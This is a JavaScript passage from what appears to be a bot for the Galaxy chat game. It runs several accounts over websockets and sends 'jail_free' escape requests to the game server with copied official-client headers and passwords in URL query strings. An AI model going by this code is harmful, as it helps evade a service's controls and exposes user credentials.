            var escape = document.getElementById("releasenow");
            escape.click();
            var planet = document.getElementById("planet").value;
            setTimeout(() => {
              if (ws5 && ws5.readyState === 1) {
                ws5.send(`JOIN ${planet}\r\n`);
                console.log('DEBUG ws5 autorelease: rejoined planet after escape');
              } else {
                console.log('DEBUG ws5 autorelease: ws5 not connected, cannot rejoin');
              }
            }, 3000);
          }, 1000);
        }
      }

      if (snippets[0] === "900") {
        // Log current planet for ws5 (optional, can be removed if not needed)
        console.log('ws5 current planet:', snippets[1]);
      }

    }
  }


});

document.getElementById("plntgo").addEventListener("click", () => {
  try {
  ws1.send("JOIN " + document.getElementById("planet").value + "\r\n");
  } catch (error) {

  }
  try {
  ws2.send("JOIN " + document.getElementById("planet").value + "\r\n");
  } catch (error) {
    
  }
  try {
  ws3.send("JOIN " + document.getElementById("planet").value + "\r\n");
  } catch (error) {
    
  }
  try {
  ws4.send("JOIN " + document.getElementById("planet").value + "\r\n");
  } catch (error) {
    
  }
  try {
  ws5.send("JOIN " + document.getElementById("planet").value + "\r\n");
  ws5.send("REMOVE -999\r\n");
  } catch (error) {
    
  }
});



document.getElementById("releasenow").addEventListener("click", async () => {
  console.log('DEBUG: releasenow click triggered, calling escape1-5');
  
  // Call all escape functions in parallel (original implementation)
  try {
    const [result1, result2, result3, result4, result5] = await Promise.all([
      escape1(),
      escape2(),
      escape3(),
      escape4(),
      escape5()
    ]);
    
    console.log('All escape functions completed (including Code 4 Alt)');
  } catch (error) {
    console.error('Error during escape sequence:', error);
  }
});

document
  .getElementById("btn-disconnect")
  .addEventListener("click", () => {
    // IMPORTANT: Set work to false FIRST to prevent reconnections
    work = false;
    
    // Clear all pending timeouts
    try { clearTimeout(timeout1); } catch (error) { }
    try { clearTimeout(timeout2); } catch (error) { }
    try { clearTimeout(timeout3); } catch (error) { }
    try { clearTimeout(timeout4); } catch (error) { }
    
    // Function to properly close a websocket
    const closeWebSocket = (ws, wsName) => {
      if (!ws) return;
      
      try {
        // Only send QUIT if websocket is in OPEN state
        if (ws.readyState === 1) { // 1 = OPEN
          ws.send("QUIT :ds\r\n");
        }
        
        // Remove event handlers to prevent any further processing
        ws.onopen = null;
        ws.onmessage = null;
        ws.onerror = null;
        ws.onclose = null;
        
        // Close or terminate based on sleep mode
        if (sleep.checked && typeof ws.terminate === 'function') {
          ws.terminate();
        } else if (ws.readyState !== 3) { // 3 = CLOSED
          ws.close();
        }
      } catch (error) {
        console.log(`Error closing ${wsName}:`, error);
      }
    };
    
    // Close all websockets with a small delay to ensure QUIT is sent
    closeWebSocket(ws1, 'ws1');
    closeWebSocket(ws2, 'ws2');
    closeWebSocket(ws3, 'ws3');
    closeWebSocket(ws4, 'ws4');
    closeWebSocket(ws5, 'ws5');
    
    // Nullify websocket references after a short delay
    setTimeout(() => {
      ws1 = null;
      ws2 = null;
      ws3 = null;
      ws4 = null;
      ws5 = null;
    }, 100);
    
    // Reset all connection flags
    ws1on = false;
    ws2on = false;
    ws3on = false;
    ws4on = false;
    ws5on = false;
    
    // Reset user found flags
    userFound1 = false;
    userFound2 = false;
    userFound3 = false;
    userFound4 = false;
    
    log1.innerHTML += "Program terminated.<br>";
    log2.innerHTML += "Program terminated.<br>";
    log3.innerHTML += "Program terminated.<br>";
    log4.innerHTML += "Program terminated.<br>";
    log1.scrollTop = log1.scrollHeight;
    log2.scrollTop = log2.scrollHeight;
    log3.scrollTop = log3.scrollHeight;
    log4.scrollTop = log4.scrollHeight;

    localStorage.setItem("rc1", document.getElementById("rc1").value);
    localStorage.setItem("rc2", document.getElementById("rc2").value);
    localStorage.setItem("rc3", document.getElementById("rc3").value);
    localStorage.setItem("rc4", document.getElementById("rc4").value);
    localStorage.setItem("kickrc", document.getElementById("kickrc").value);
    localStorage.setItem("rcl1", document.getElementById("rcl1").value);
    localStorage.setItem("rcl2", document.getElementById("rcl2").value);
    localStorage.setItem("rcl3", document.getElementById("rcl3").value);
    localStorage.setItem("rcl4", document.getElementById("rcl4").value);
    localStorage.setItem("planet", document.getElementById("planet").value);
    localStorage.setItem("blacklist", document.getElementById("blacklist").value);
    localStorage.setItem("gangblacklist", document.getElementById("gangblacklist").value);
    localStorage.setItem("kblacklist", document.getElementById("kblacklist").value);
    localStorage.setItem("kgangblacklist", document.getElementById("kgangblacklist").value);
    localStorage.setItem("attack1", document.getElementById("attack1").value);
    localStorage.setItem("attack2", document.getElementById("attack2").value);
    localStorage.setItem("attack3", document.getElementById("attack3").value);
    localStorage.setItem("attack4", document.getElementById("attack4").value);
    localStorage.setItem("waiting1", document.getElementById("waiting1").value);
    localStorage.setItem("waiting2", document.getElementById("waiting2").value);
    localStorage.setItem("waiting3", document.getElementById("waiting3").value);
    localStorage.setItem("waiting4", document.getElementById("waiting4").value);
    localStorage.setItem("incrementvalue", document.getElementById("incrementvalue").value);
    localStorage.setItem("decrementvalue", document.getElementById("decrementvalue").value);
    localStorage.setItem("mindef", document.getElementById("mindef").value);
    localStorage.setItem("maxdef", document.getElementById("maxdef").value);
    localStorage.setItem("minatk", document.getElementById("minatk").value);
    localStorage.setItem("maxatk", document.getElementById("maxatk").value);
    localStorage.setItem("reconnect", document.getElementById("reconnect").value);
    localStorage.setItem("android", document.getElementById("android").checked);
    localStorage.setItem("ios", document.getElementById("ios").checked);
    localStorage.setItem("web", document.getElementById("web").checked);
    localStorage.setItem("smart", document.getElementById("smart").checked);
    localStorage.setItem("exitting", document.getElementById("exitting").checked);
    localStorage.setItem("sleeping", document.getElementById("sleeping").checked);
    localStorage.setItem("autorelease", document.getElementById("autorelease").checked);
    localStorage.setItem("lowsecmode", document.getElementById("lowsecmode").checked);
  });

async function escape1() {
  try {
    const userID = useridg1;
    const password = passwordg1;
    const boundary = '----WebKitFormBoundarylRahhWQJyn2QX0gB';
    const formData = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="a"',
        '',
        'jail_free',
        `--${boundary}`,
        'Content-Disposition: form-data; name="type"',
        '',
        'escapeItemDiamond',
        `--${boundary}`,
        'Content-Disposition: form-data; name="usercur"',
        '',
        userID,
        `--${boundary}`,
        'Content-Disposition: form-data; name="ajax"',
        '',
        '1',
        `--${boundary}--`
    ].join('\r\n');
    
    const url = `https://galaxy.mobstudio.ru/services/?&userID=${userID}&password=${password}&query_rand=${Math.random()}`;
    const parsedUrl = new URL(url);
    const options = {
        hostname: parsedUrl.hostname,
        port: 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': Buffer.byteLength(formData),
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Priority': 'u=1, i',
            'Sec-CH-UA': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Galaxy-Client-Ver': '9.5',
            'X-Galaxy-Kbv': '352',
            'X-Galaxy-Lng': 'en',
            'X-Galaxy-Model': 'chrome 137.0.0.0',
            'X-Galaxy-Orientation': 'portrait',
            'X-Galaxy-Os-Ver': '1',
            'X-Galaxy-Platform': 'web',
            'X-Galaxy-Scr-Dpi': '1',
            'X-Galaxy-Scr-H': '675',
            'X-Galaxy-Scr-W': '700',
            'X-Galaxy-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
    };
    
    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                console.log('Escape1 response:', data);
                // Check if response indicates wrong escape type
                if (data && data.includes && data.includes("Wrong escape type")) {
                  log1.innerHTML += "Wrong escape type detected for connection 1<br>";
                  log1.scrollTop = log1.scrollHeight;
                }
                resolve(data);
            });
            res.on('error', (error) => {
                console.log('Response error for escape1:', error);
                log1.innerHTML += "Error with escape1: " + error.message + "<br>";
                log1.scrollTop = log1.scrollHeight;
                reject(error);
            });
        });
        
        req.on('error', (error) => {
            console.log('Request error performing escape1:', error.message);
            log1.innerHTML += "Error with escape1: " + error.message + "<br>";
            log1.scrollTop = log1.scrollHeight;
            reject(error);
        });
        req.on('timeout', () => {
            console.log('Request timeout for escape1');
            req.destroy();
            log1.innerHTML += "Timeout with escape1<br>";
            log1.scrollTop = log1.scrollHeight;
            reject(new Error('Request timeout'));
        });
        req.setTimeout(3000);
        req.write(formData);
        req.end();
    });
  } catch (error) {
    console.log('Escape1 error:', error);
    log1.innerHTML += "Error with escape1: " + error.message + "<br>";
    log1.scrollTop = log1.scrollHeight;
    return null;
  }
}

async function escape4() {
  try {
    const userID = useridg4;
    const password = passwordg4;
    const boundary = '----WebKitFormBoundarylRahhWQJyn2QX0gB';
    const formData = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="a"',
        '',
        'jail_free',
        `--${boundary}`,
        'Content-Disposition: form-data; name="type"',
        '',
        'escapeItemDiamond',
        `--${boundary}`,
        'Content-Disposition: form-data; name="usercur"',
        '',
        userID,
        `--${boundary}`,
        'Content-Disposition: form-data; name="ajax"',
        '',
        '1',
        `--${boundary}--`
    ].join('\r\n');
    
    const url = `https://galaxy.mobstudio.ru/services/?&userID=${userID}&password=${password}&query_rand=${Math.random()}`;
    const parsedUrl = new URL(url);
    const options = {
        hostname: parsedUrl.hostname,
        port: 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': Buffer.byteLength(formData),
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Priority': 'u=1, i',
            'Sec-CH-UA': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Galaxy-Client-Ver': '9.5',
            'X-Galaxy-Kbv': '352',
            'X-Galaxy-Lng': 'en',
            'X-Galaxy-Model': 'chrome 137.0.0.0',
            'X-Galaxy-Orientation': 'portrait',
            'X-Galaxy-Os-Ver': '1',
            'X-Galaxy-Platform': 'web',
            'X-Galaxy-Scr-Dpi': '1',
            'X-Galaxy-Scr-H': '675',
            'X-Galaxy-Scr-W': '700',
            'X-Galaxy-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
    };
    
    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                console.log('Escape4 response:', data);
                // Check if response indicates wrong escape type
                if (data && data.includes && data.includes("Wrong escape type")) {
                  log4.innerHTML += "Wrong escape type detected for connection 4<br>";
                  log4.scrollTop = log4.scrollHeight;
                }
                resolve(data);
            });
            res.on('error', (error) => {
                console.log('Response error for escape4:', error);
                log4.innerHTML += "Error with escape4: " + error.message + "<br>";
                log4.scrollTop = log4.scrollHeight;
                reject(error);
            });
        });
        
        req.on('error', (error) => {
            console.log('Request error performing escape4:', error.message);
            log4.innerHTML += "Error with escape4: " + error.message + "<br>";
            log4.scrollTop = log4.scrollHeight;
            reject(error);
        });
        req.on('timeout', () => {
            console.log('Request timeout for escape4');
            req.destroy();
            log4.innerHTML += "Timeout with escape4<br>";
            log4.scrollTop = log4.scrollHeight;
            reject(new Error('Request timeout'));
        });
        req.setTimeout(3000);
        req.write(formData);
        req.end();
    });
  } catch (error) {
    console.log('Escape4 error:', error);
    log4.innerHTML += "Error with escape4: " + error.message + "<br>";
    log4.scrollTop = log4.scrollHeight;
    return null;
  }
}

async function escape2() {
  try {
    const userID = useridg2;
    const password = passwordg2;
    const boundary = '----WebKitFormBoundarylRahhWQJyn2QX0gB';
    const formData = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="a"',
        '',
        'jail_free',
        `--${boundary}`,
        'Content-Disposition: form-data; name="type"',
        '',
        'escapeItemDiamond',
        `--${boundary}`,
        'Content-Disposition: form-data; name="usercur"',
        '',
        userID,
        `--${boundary}`,
        'Content-Disposition: form-data; name="ajax"',
        '',
        '1',
        `--${boundary}--`
    ].join('\r\n');
    
    const url = `https://galaxy.mobstudio.ru/services/?&userID=${userID}&password=${password}&query_rand=${Math.random()}`;
    const parsedUrl = new URL(url);
    const options = {
        hostname: parsedUrl.hostname,
        port: 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': Buffer.byteLength(formData),
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Priority': 'u=1, i',
            'Sec-CH-UA': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Galaxy-Client-Ver': '9.5',
            'X-Galaxy-Kbv': '352',
            'X-Galaxy-Lng': 'en',
            'X-Galaxy-Model': 'chrome 137.0.0.0',
            'X-Galaxy-Orientation': 'portrait',
            'X-Galaxy-Os-Ver': '1',
            'X-Galaxy-Platform': 'web',
            'X-Galaxy-Scr-Dpi': '1',
            'X-Galaxy-Scr-H': '675',
            'X-Galaxy-Scr-W': '700',
            'X-Galaxy-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
    };
    
    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                console.log('Escape2 response:', data);
                // Check if response indicates wrong escape type
                if (data && data.includes && data.includes("Wrong escape type")) {
                  log2.innerHTML += "Wrong escape type detected for connection 2<br>";
                  log2.scrollTop = log2.scrollHeight;
                }
                resolve(data);
            });
            res.on('error', (error) => {
                console.log('Response error for escape2:', error);
                log2.innerHTML += "Error with escape2: " + error.message + "<br>";
                log2.scrollTop = log2.scrollHeight;
                reject(error);
            });
        });
        
        req.on('error', (error) => {
            console.log('Request error performing escape2:', error.message);
            log2.innerHTML += "Error with escape2: " + error.message + "<br>";
            log2.scrollTop = log2.scrollHeight;
            reject(error);
        });
        req.on('timeout', () => {
            console.log('Request timeout for escape2');
            req.destroy();
            log2.innerHTML += "Timeout with escape2<br>";
            log2.scrollTop = log2.scrollHeight;
            reject(new Error('Request timeout'));
        });
        req.setTimeout(3000);
        req.write(formData);
        req.end();
    });
  } catch (error) {
    console.log('Escape2 error:', error);
    log2.innerHTML += "Error with escape2: " + error.message + "<br>";
    log2.scrollTop = log2.scrollHeight;
    return null;
  }
}

async function escape3() {
  try {
    const userID = useridg3;
    const password = passwordg3;
    const boundary = '----WebKitFormBoundarylRahhWQJyn2QX0gB';
    const formData = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="a"',
        '',
        'jail_free',
        `--${boundary}`,
        'Content-Disposition: form-data; name="type"',
        '',
        'escapeItemDiamond',
        `--${boundary}`,
        'Content-Disposition: form-data; name="usercur"',
        '',
        userID,
        `--${boundary}`,
        'Content-Disposition: form-data; name="ajax"',
        '',
        '1',
        `--${boundary}--`
    ].join('\r\n');
    
    const url = `https://galaxy.mobstudio.ru/services/?&userID=${userID}&password=${password}&query_rand=${Math.random()}`;
    const parsedUrl = new URL(url);
    const options = {
        hostname: parsedUrl.hostname,
        port: 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': Buffer.byteLength(formData),
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Priority': 'u=1, i',
            'Sec-CH-UA': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Galaxy-Client-Ver': '9.5',
            'X-Galaxy-Kbv': '352',
            'X-Galaxy-Lng': 'en',
            'X-Galaxy-Model': 'chrome 137.0.0.0',
            'X-Galaxy-Orientation': 'portrait',
            'X-Galaxy-Os-Ver': '1',
            'X-Galaxy-Platform': 'web',
            'X-Galaxy-Scr-Dpi': '1',
            'X-Galaxy-Scr-H': '675',
            'X-Galaxy-Scr-W': '700',
            'X-Galaxy-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
    };
    
    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                console.log('Escape3 response:', data);
                // Check if response indicates wrong escape type
                if (data && data.includes && data.includes("Wrong escape type")) {
                  log3.innerHTML += "Wrong escape type detected for connection 3<br>";
                  log3.scrollTop = log3.scrollHeight;
                }
                resolve(data);
            });
            res.on('error', (error) => {
                console.log('Response error for escape3:', error);
                log3.innerHTML += "Error with escape3: " + error.message + "<br>";
                log3.scrollTop = log3.scrollHeight;
                reject(error);
            });
        });
        
        req.on('error', (error) => {
            console.log('Request error performing escape3:', error.message);
            log3.innerHTML += "Error with escape3: " + error.message + "<br>";
            log3.scrollTop = log3.scrollHeight;
            reject(error);
        });
        req.on('timeout', () => {
            console.log('Request timeout for escape3');
            req.destroy();
            log3.innerHTML += "Timeout with escape3<br>";
            log3.scrollTop = log3.scrollHeight;
            reject(new Error('Request timeout'));
        });
        req.setTimeout(3000);
        req.write(formData);
        req.end();
    });
  } catch (error) {
    console.log('Escape3 error:', error);
    log3.innerHTML += "Error with escape3: " + error.message + "<br>";
    log3.scrollTop = log3.scrollHeight;
    return null;
  }
}

async function escape5() {
  try {
    const userID = useridg5;
    const password = passwordg5;
    const boundary = '----WebKitFormBoundarylRahhWQJyn2QX0gB';
    const formData = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="a"',
        '',
        'jail_free',
        `--${boundary}`,
        'Content-Disposition: form-data; name="type"',
        '',
        'escapeItemDiamond',
        `--${boundary}`,
        'Content-Disposition: form-data; name="usercur"',
        '',
        userID,
        `--${boundary}`,
        'Content-Disposition: form-data; name="ajax"',
        '',
        '1',
        `--${boundary}--`
    ].join('\r\n');
    
    const url = `https://galaxy.mobstudio.ru/services/?&userID=${userID}&password=${password}&query_rand=${Math.random()}`;
    const parsedUrl = new URL(url);
    const options = {
        hostname: parsedUrl.hostname,
        port: 443,
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': Buffer.byteLength(formData),
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Priority': 'u=1, i',
            'Sec-CH-UA': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Galaxy-Client-Ver': '9.5',
            'X-Galaxy-Kbv': '352',
            'X-Galaxy-Lng': 'en',
            'X-Galaxy-Model': 'chrome 137.0.0.0',
            'X-Galaxy-Orientation': 'portrait',
            'X-Galaxy-Os-Ver': '1',
            'X-Galaxy-Platform': 'web',
            'X-Galaxy-Scr-Dpi': '1',
            'X-Galaxy-Scr-H': '675',
            'X-Galaxy-Scr-W': '700',
            'X-Galaxy-User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
        }
    };
    
    return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                console.log('Escape5 response:', data);
                // Check if response indicates wrong escape type
                if (data && data.includes && data.includes("Wrong escape type")) {
                  log4.innerHTML += "Wrong escape type detected for connection 5 (Code 4 Alt)<br>";
                  log4.scrollTop = log4.scrollHeight;
                }
                resolve(data);
            });
            res.on('error', (error) => {
                console.log('Response error for Escape5:', error);
                log4.innerHTML += "Error with Escape5: " + error.message + "<br>";
                log4.scrollTop = log4.scrollHeight;
                reject(error);
            });
        });
        
        req.on('error', (error) => {
            console.log('Request error performing Escape5:', error.message);
            log4.innerHTML += "Error with Escape5: " + error.message + "<br>";
            log4.scrollTop = log4.scrollHeight;
            reject(error);
        });
        req.on('timeout', () => {
            console.log('Request timeout for Escape5');
            req.destroy();
            log4.innerHTML += "Timeout with Escape5<br>";
            log4.scrollTop = log4.scrollHeight;
            reject(new Error('Request timeout'));
        });
        req.setTimeout(3000);
        req.write(formData);
        req.end();
    });
  } catch (error) {
    console.log('Escape5 error:', error);
    log4.innerHTML += "Error with Escape5: " + error.message + "<br>";
    log4.scrollTop = log4.scrollHeight;
    return null;
  }
}
